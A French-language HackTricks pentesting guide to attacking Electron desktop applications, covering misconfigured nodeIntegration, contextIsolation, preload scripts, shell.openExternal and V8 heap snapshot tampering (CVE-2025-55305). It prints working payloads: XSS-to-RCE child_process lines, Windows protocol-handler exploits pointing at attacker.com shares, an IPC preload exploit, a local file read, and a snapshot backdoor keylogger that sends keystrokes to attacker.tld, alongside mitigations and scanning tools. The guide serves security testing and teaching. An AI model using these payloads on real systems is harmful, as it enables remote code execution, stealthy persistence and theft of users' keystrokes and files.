# Applications de bureau Electron

{{#include ../../../banners/hacktricks-training.md}}

## Introduction

Electron combine un backend local (avec **NodeJS**) et un frontend (**Chromium**), bien qu'il lui manque certains mécanismes de sécurité des navigateurs modernes.

D'habitude, vous pouvez trouver le code de l'application Electron à l'intérieur d'une application `.asar`. Pour obtenir le code, vous devez l'extraire :
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Dans le code source d'une application Electron, à l'intérieur de `packet.json`, vous pouvez trouver spécifié le fichier `main.js` où les configurations de sécurité sont définies.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron a 2 types de processus :

- Main Process (a un accès complet à NodeJS)
- Renderer Process (devrait avoir un accès NodeJS restreint pour des raisons de sécurité)

![](<../../../images/image (182).png>)

Un **renderer process** sera une fenêtre de navigateur chargeant un fichier :
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Les paramètres du **processus de rendu** peuvent être **configurés** dans le **processus principal** à l'intérieur du fichier main.js. Certaines des configurations permettront d'**empêcher l'application Electron d'obtenir un RCE** ou d'autres vulnérabilités si les **paramètres sont correctement configurés**.

L'application electron **pourrait accéder à l'appareil** via les Node apis bien qu'il soit possible de la configurer pour l'en empêcher :

- **`nodeIntegration`** - est `off` par défaut. Si `on`, permet d'accéder aux fonctionnalités de Node depuis le processus de rendu.
- **`contextIsolation`** - est `on` par défaut. Si `off`, les processus principal et de rendu ne sont pas isolés.
- **`preload`** - vide par défaut.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - est `off` par défaut. Il restreindra les actions que NodeJS peut effectuer.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`** - est `off` par défaut.
- Si **`nodeIntegration`** est **enabled**, cela permettrait l'utilisation des **Node.js APIs** dans des pages web **chargées dans des iframes** au sein d'une application Electron.
- Si **`nodeIntegration`** est **disabled**, alors les preloads se chargeront dans l'iframe

Exemple de configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Quelques **RCE payloads** depuis [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Capturer le trafic

Modifiez la configuration start-main et ajoutez l'utilisation d'un proxy tel que :
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Si vous pouvez exécuter localement une Electron App, il est possible de lui faire exécuter du code javascript arbitraire. Regardez comment dans :

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Si la **nodeIntegration** est réglée sur **on**, le JavaScript d'une page web peut utiliser facilement les fonctionnalités de Node.js simplement en appelant `require()`. Par exemple, la façon d'exécuter l'application calc sur Windows est :
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Le script indiqué dans ce paramètre est **chargé avant les autres scripts dans le renderer**, donc il a **un accès illimité aux Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Par conséquent, le script peut exporter node-features vers des pages:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Si `contextIsolation` est activé, ceci ne fonctionnera pas**

## RCE: XSS + contextIsolation

Le _**contextIsolation**_ introduit des **contextes séparés entre les scripts de la page web et le code interne JavaScript d'Electron** afin que l'exécution JavaScript de chaque code n'affecte pas l'autre. C'est une fonctionnalité nécessaire pour éliminer la possibilité de RCE.

Si les contextes ne sont pas isolés, un attaquant peut :

1. Exécuter **arbitrary JavaScript in renderer** (XSS ou navigation vers des sites externes)
2. **Écraser la méthode built-in** qui est utilisée dans preload ou le code interne d'Electron pour prendre le contrôle d'une fonction
3. **Déclencher** l'utilisation de la **fonction écrasée**
4. RCE?

Il y a 2 endroits où les méthodes intégrées peuvent être écrasées : dans le code preload ou dans le code interne d'Electron :


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Contourner l'événement de click

S'il y a des restrictions appliquées lorsque vous cliquez sur un lien, vous pouvez peut-être les contourner **en effectuant un clic du milieu** au lieu d'un clic gauche classique.
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Pour plus d'informations sur ces exemples, consultez [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) et [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Lors du déploiement d'une application de bureau Electron, s'assurer des paramètres corrects pour `nodeIntegration` et `contextIsolation` est crucial. Il est établi que **client-side remote code execution (RCE)** ciblant les preload scripts ou le native code d'Electron depuis le main process est effectivement empêché lorsque ces paramètres sont en place.

Lorsqu'un utilisateur interagit avec des liens ou ouvre de nouvelles fenêtres, des event listeners spécifiques sont déclenchés, qui sont cruciaux pour la sécurité et le fonctionnement de l'application :
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
These listeners are **overridden by the desktop application** to implement its own **business logic**. The application evaluates whether a navigated link should be opened internally or in an external web browser. This decision is typically made through a function, `openInternally`. If this function returns `false`, it indicates that the link should be opened externally, utilizing the `shell.openExternal` function.

**Voici un pseudocode simplifié :**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Les bonnes pratiques de sécurité d'Electron JS déconseillent d'accepter du contenu non fiable avec la fonction `openExternal`, car cela pourrait mener à une RCE via divers protocoles. Les systèmes d'exploitation prennent en charge différents protocoles pouvant déclencher une RCE. Pour des exemples détaillés et des explications supplémentaires sur ce sujet, on peut consulter [cette ressource](https://positive.security/blog/url-open-rce#windows-10-19042), qui inclut des exemples de protocoles Windows capables d'exploiter cette vulnérabilité.

Sur macos, la fonction `openExternal` peut être exploitée pour exécuter des commandes arbitraires, par exemple `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Exemples d'exploits de protocoles Windows incluent :**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + IPC preload vulnérable + shell.openExternal

Cette vulnérabilité se trouve dans **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Le **webviewTag** est une **fonctionnalité obsolète** qui permet l'utilisation de **NodeJS** dans le **processus de rendu**, elle devrait être désactivée car elle permet de charger un script dans le contexte preload comme :
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Par conséquent, un attaquant qui parvient à charger une page arbitraire pourrait utiliser cette balise pour **charger un preload script arbitraire**.

Ce preload script a ensuite été détourné pour appeler un **service IPC vulnérable (`skype-new-window`)** qui appelait **`shell.openExternal`** afin d'obtenir RCE :
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Lecture des fichiers internes : XSS + contextIsolation

**Désactiver `contextIsolation` permet l'utilisation des balises `<webview>`**, similaires à `<iframe>`, pour lire et exfiltrating des fichiers locaux. Un exemple fourni montre comment exploiter cette vulnérabilité pour lire le contenu des fichiers internes :

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

De plus, une autre méthode pour **lire un fichier interne** est présentée, mettant en évidence une vulnérabilité critique de lecture de fichier local dans une Electron desktop app. Cela implique d'injecter un script pour exploiter l'application et exfiltrate des données :
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Old Chromium**

Si le **chromium** utilisé par l'application est **ancien** et qu'il existe des **vulnérabilités** **connues** le concernant, il peut être possible de **l'exploiter et d'obtenir une RCE via un XSS**.\
Vous pouvez voir un exemple dans ce **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Si vous avez trouvé une XSS mais que vous **ne pouvez pas déclencher une RCE ni voler des fichiers internes**, vous pouvez essayer de l'utiliser pour **voler des identifiants via phishing**.

Tout d'abord, vous devez savoir ce qui se passe lorsque vous essayez d'ouvrir une nouvelle URL, en vérifiant le code JS du front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
L'appel à **`openInternally`** déterminera si le **link** sera **opened** dans la **desktop window**, car il s'agit d'un link appartenant à la plateforme, **or** s'il sera ouvert dans le **browser as a 3rd party resource**.

Dans le cas où le **regex** utilisé par la fonction est **vulnerable to bypasses** (par exemple en **not escaping the dots of subdomains**), un attaquant pourrait abuser de la XSS pour **open a new window which** qui sera située dans l'infrastructure de l'attaquant et **asking for credentials** à l'utilisateur :
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protocole

Comme indiqué dans [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), les pages exécutées sur **`file://`** ont un accès unilatéral à tous les fichiers de votre machine, ce qui signifie que des **XSS issues peuvent être utilisées pour charger des fichiers arbitraires** depuis la machine de l'utilisateur. L'utilisation d'un **protocole personnalisé** prévient ce type de problèmes en vous permettant de limiter le protocole à la fourniture d'un ensemble spécifique de fichiers.

## Remote module

Le Remote module d'Electron permet aux **processus de rendu d'accéder aux API du processus principal**, facilitant la communication au sein d'une application Electron. Cependant, l'activation de ce module introduit des risques de sécurité importants. Il élargit la surface d'attaque de l'application, la rendant plus susceptible à des vulnérabilités telles que les cross-site scripting (XSS) attacks.

> [!TIP]
> Bien que le module **remote** expose certaines API du main vers les renderer processes, il n'est pas trivial d'obtenir une RCE uniquement en abusant des composants. Cependant, ces composants peuvent exposer des informations sensibles.

> [!WARNING]
> De nombreuses applications qui utilisent encore le module remote le font d'une manière qui **requiert que NodeIntegration soit activé** dans le renderer process, ce qui constitue un **énorme risque de sécurité**.

Depuis Electron 14, le module `remote` d'Electron peut être activé de plusieurs manières ; pour des raisons de sécurité et de performance, il est **recommandé de ne pas l'utiliser**.

Pour l'activer, il faut d'abord **l'activer dans le main process** :
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Ensuite, le processus de rendu peut importer des objets depuis le module comme ceci :
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Le **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** indique quelques **fonctions** intéressantes exposées par l'objet **`app`** du module remote:

- **`app.relaunch([options])`**
- **Redémarre** l'application en **quittant** l'instance courante et en **lançant** une nouvelle. Utile pour les **mises à jour de l'application** ou des **changements d'état** importants.
- **`app.setAppLogsPath([path])`**
- **Définit** ou **crée** un répertoire pour stocker les **app logs**. Les logs peuvent être **récupérés** ou **modifiés** en utilisant **`app.getPath()`** ou **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Enregistre** l'exécutable courant comme le **gestionnaire par défaut** pour un **protocole** spécifié. Vous pouvez fournir un **chemin personnalisé** et des **arguments** si besoin.
- **`app.setUserTasks(tasks)`**
- **Ajoute** des tâches à la **catégorie Tasks** dans la **Jump List** (sur Windows). Chaque tâche peut contrôler comment l'app est **lancée** ou quels **arguments** sont passés.
- **`app.importCertificate(options, callback)`**
- **Importe** un **certificat PKCS#12** dans le **magasin de certificats** du système (Linux uniquement). Un **callback** peut être utilisé pour traiter le résultat.
- **`app.moveToApplicationsFolder([options])`**
- **Déplace** l'application vers le **dossier Applications** (sur macOS). Aide à garantir une **installation standard** pour les utilisateurs Mac.
- **`app.setJumpList(categories)`**
- **Définit** ou **supprime** une **Jump List personnalisée** sur **Windows**. Vous pouvez préciser des **catégories** pour organiser la manière dont les tâches apparaissent à l'utilisateur.
- **`app.setLoginItemSettings(settings)`**
- **Configure** quels **exécutables** se lancent à la **connexion** ainsi que leurs **options** (uniquement macOS et Windows).

Example:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

L'**API principale** pour accéder aux préférences système et **émettre des événements système** dans Electron. Des méthodes comme **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, et **setUserDefault** font toutes **partie de** ce module.

**Exemple d'utilisation :**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Écoute** les **notifications macOS natives** en utilisant NSDistributedNotificationCenter.
* Avant **macOS Catalina**, vous pouviez sniff **toutes** les notifications distribuées en passant **nil** à CFNotificationCenterAddObserver.
* Après **Catalina / Big Sur**, les apps sandboxées peuvent encore **s'abonner** à de **nombreux événements** (par exemple, **verrouillages/déverrouillages d'écran**, **montages de volumes**, **activité réseau**, etc.) en enregistrant des notifications **par nom**.

### **getUserDefault / setUserDefault**

* **Interagit** avec **NSUserDefaults**, qui stocke les préférences **application** ou **globales** sur macOS.

* **getUserDefault** peut **récupérer** des informations sensibles, telles que les **emplacements de fichiers récents** ou la **localisation géographique de l'utilisateur**.

* **setUserDefault** peut **modifier** ces préférences, affectant potentiellement la **configuration** d'une application.

* Dans les **anciennes versions d'Electron** (avant v8.3.0), seule la **suite standard** de NSUserDefaults était **accessible**.

## Shell.showItemInFolder

Cette fonction affiche le fichier donné dans un gestionnaire de fichiers, ce qui **pourrait exécuter automatiquement le fichier**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Les applications Electron devraient avoir une **Content Security Policy (CSP)** pour **empêcher les attaques XSS**. La **CSP** est une **norme de sécurité** qui aide à **empêcher** l'**exécution** de **code non approuvé** dans le navigateur.

Elle est généralement **configurée** dans le fichier **`main.js`** ou dans le template **`index.html`** avec la CSP à l'intérieur d'une **meta tag**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Cette chaîne réelle a affecté Visual Studio Code 1.63 (CVE-2021-43908) et démontre comment un seul XSS piloté par du markdown dans un webview peut être escaladé en RCE complet lorsque la CSP, postMessage et les handlers de scheme sont mal configurés. Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt

Attack chain overview
- First XSS via webview CSP: The generated CSP included `style-src 'self' 'unsafe-inline'`, allowing inline/style-based injection in a `vscode-webview://` context. The payload beaconed to `/stealID` to exfiltrate the target webview’s extensionId.
- Constructing target webview URL: En utilisant le leaked ID pour construire `vscode-webview://<extensionId>/.../<publicUrl>`.
- Second XSS via postMessage trust: Le webview externe faisait confiance à `window.postMessage` sans vérifications strictes d'origin/type et chargeait du HTML attaquant avec `allowScripts: true`.
- Local file loading via scheme/path rewriting: Le payload réécrivait `file:///...` en `vscode-file://vscode-app/...` et remplaçait `exploit.md` par `RCE.html`, abusant d'une validation de chemin faible pour charger une ressource locale privilégiée.
- RCE in Node-enabled context: Le HTML chargé s'exécutait avec les API Node disponibles, permettant l'exécution de commandes OS.

Example RCE primitive in the final context
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```
Lectures complémentaires sur les problèmes de confiance liés à postMessage :

{{#ref}}
../../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## **Outils**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) est un outil pour identifier les mauvaises configurations et les anti-patterns de sécurité dans les applications basées sur Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) est une extension open source pour VS Code destinée aux applications Electron qui utilise Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) pour vérifier les bibliothèques tierces vulnérables
- [**Electro.ng**](https://electro.ng/): Vous devez l'acheter

## Laboratoires

Dans [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) vous pouvez trouver un lab montrant comment exploiter des applications Electron vulnérables.

Quelques commandes qui vous aideront pour le lab:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Les applications basées sur Electron et Chromium désérialisent un V8 heap snapshot préconstruit au démarrage (v8_context_snapshot.bin, et éventuellement browser_v8_context_snapshot.bin) pour initialiser chaque V8 isolate (main, preload, renderer). Historiquement, les mécanismes d'intégrité d'Electron ne considéraient pas ces snapshots comme du contenu exécutable, ils échappaient donc à la fois à l'application des vérifications d'intégrité basées sur les fuses et aux contrôles de signature de code du système d'exploitation. En conséquence, remplacer le snapshot dans une installation modifiable par l'utilisateur permettait une exécution de code furtive et persistante au sein de l'app sans modifier les binaires signés ni l'ASAR.

Key points
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar validate app JavaScript inside the ASAR, but they did not cover V8 heap snapshots (CVE-2025-55305). Chromium similarly does not integrity-check snapshots.
- Attack preconditions: Local file write into the app’s installation directory. This is common on systems where Electron apps or Chromium browsers are installed under user-writable paths (e.g., %AppData%\Local on Windows; /Applications with caveats on macOS).
- Effect: Reliable execution of attacker JavaScript in any isolate by clobbering a frequently used builtin (a “gadget”), enabling persistence and evasion of code-signing verification.
- Affected surface: Electron apps (even with fuses enabled) and Chromium-based browsers that load snapshots from user-writable locations.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Routage de payload conscient des isolates (exécuter du code différent dans main vs. renderer)
- Détection du processus principal : des Node-only globals comme process.pid, process.binding(), ou process.dlopen sont présents dans l'isolate du processus principal.
- Détection Browser/renderer : des Browser-only globals comme alert sont disponibles lorsqu'on s'exécute dans un contexte de document.

Exemple de gadget qui sonde une fois les capacités Node du processus principal
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context PoC de vol de données (p.ex., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Flux de travail de l'opérateur
1) Écrire payload.js qui remplace un builtin courant (par ex., Array.isArray) et effectue éventuellement des branches par isolate.
2) Construire le snapshot sans les sources Chromium:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Écraser le(s) fichier(s) snapshot de l'application cible :
- v8_context_snapshot.bin (always used)
- browser_v8_context_snapshot.bin (si le fuse LoadBrowserProcessSpecificV8Snapshot est utilisé)
4) Lancer l'application ; le gadget s'exécute chaque fois que le builtin choisi est utilisé.

Notes et considérations
- Contournement d'intégrité/signature : les fichiers snapshot ne sont pas considérés comme des exécutables natifs par les vérifications de code-signing et (historiquement) n'étaient pas couverts par les fuses d'Electron ni par les contrôles d'intégrité de Chromium.
- Persistance : remplacer le snapshot dans une installation modifiable par l'utilisateur survit généralement aux redémarrages de l'application et ressemble à une application signée et légitime.
- Navigateurs Chromium : le même concept de manipulation s'applique à Chrome/derivatives installés dans des emplacements modifiables par l'utilisateur. Chrome dispose d'autres mesures d'intégrité mais exclut explicitement les attaques physiquement locales de son modèle de menace.

Détection et atténuations
- Traiter les snapshots comme du contenu exécutable et les inclure dans l'application des contrôles d'intégrité (CVE-2025-55305 fix).
- Préférer des emplacements d'installation modifiables uniquement par les admins ; établir une baseline et surveiller les hashes pour v8_context_snapshot.bin et browser_v8_context_snapshot.bin.
- Détecter le remplacement de builtin en early-runtime et les modifications inattendues de snapshot ; alerter lorsque les snapshots désérialisés ne correspondent pas aux valeurs attendues.

## **Références**

- [SecureLayer7: Electron Research in Desktop apps (Part 1)](https://blog.securelayer7.net/electron-app-security-risks/)
- [VS Code RCE PoC (CVE-2021-43908) – electrovolt](https://github.com/Sudistark/vscode-rce-electrovolt)
- [GitHub Advisory GHSA-2q4g-w47c-4674 (CVE-2020-15174)](https://github.com/advisories/GHSA-2q4g-w47c-4674)
- [MSRC: CVE-2021-43908](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-43908)
- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)
- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
